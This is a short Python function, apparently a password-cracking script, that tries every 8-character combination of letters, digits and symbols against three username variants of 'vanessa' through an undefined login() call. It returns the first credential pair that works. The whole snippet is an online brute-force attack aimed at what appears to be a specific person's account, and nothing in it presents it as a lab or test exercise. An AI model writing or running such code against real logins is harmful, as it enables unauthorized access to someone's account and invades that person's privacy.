import itertools as it
def guess_password():
    guess_username = ['vanessa','VanessaC','Vanessa95'];
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    alphabet += "0123456789!@#$%^&*()-_=+,<.>/?~`";

    for i in it.product(alphabet,repeat=8):
        for j in guess_username:
            if login(j, ''.join(i)):
                return (j, ''.join(i))
